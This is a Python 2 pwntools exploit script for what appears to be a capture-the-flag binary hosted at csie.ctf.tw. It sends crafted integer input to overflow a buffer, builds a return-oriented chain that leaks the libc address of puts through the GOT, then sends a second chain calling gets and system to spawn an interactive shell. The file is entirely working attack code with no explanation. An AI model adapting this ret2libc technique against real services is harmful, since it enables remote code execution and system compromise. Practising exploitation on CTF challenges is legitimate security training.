#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *

if __debug__:
    r = remote('127.0.0.1', 8001)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    r = remote('csie.ctf.tw', 10115)
    libc = ELF('./libc.so.6-904ccfdc58b689db3729b31171931f2e')


main = 0x804851d
puts_plt = 0x80483c0
puts_got = 0x804a010
printf_plt = 0x80483b0
printf_got = 0x804a00c

puts_off = libc.symbols['puts']
print "puts_off = ", puts_off
system_off = libc.symbols['system']
print "system_off = ", system_off
gets_off = libc.symbols['gets']
printf_off = libc.symbols['printf']

raw_input('pause')
num_ints = 1000

#r.send('3\n4\n1\n0\n2\n2\n0\n0')
#r.send('-3 -3 1 0 ' + '1 '* 1000 + '0')
a = r.recvrepeat(0.5)
r.send('-3 ')
r.recvrepeat(0.3)
r.send('-3 ')
r.recvrepeat(0.3)
r.send('1 ' * 200 + # 200 int in buffer
       '1 ' + # the j
       '201 ' + # the i
       '1 ' * 3 +
       '%d ' % puts_plt +
       '%d ' % main +
       '%d ' % puts_got +
       '0 ' # end-of-row
       )
r.recvrepeat(0.5)
r.send('1 0 ')

for i in xrange(0, 208):
    r.recvline()
base = u32(r.recvline()[:4]) - puts_off
system = base + system_off
gets = base + gets_off

ret = 0x8048386

a = r.recvrepeat(0.5)
r.send('-3 ')
r.recvrepeat(0.3)
r.send('-3 ')
r.recvrepeat(0.3)
r.send('1 ' * 200 + # 200 int in buffer
       '1 ' + # the j
       '201 ' + # the i
       '1 ' * 1 +
       ('%d ' % ret) * 2 +
       '%d ' % gets +
       '%d ' % system +
       '%d ' % puts_got +
       '%d ' % puts_got +
       '0 ' # end-of-row
       )
r.recvrepeat(0.5)
r.send('1 0 ')

for i in xrange(0, 208):
    r.recvline()
#r.send('%s 0 '%num_ints + '1 '*num_ints)
#r.send('3 4 1 1 1 1 1 1 1 ')

r.interactive()
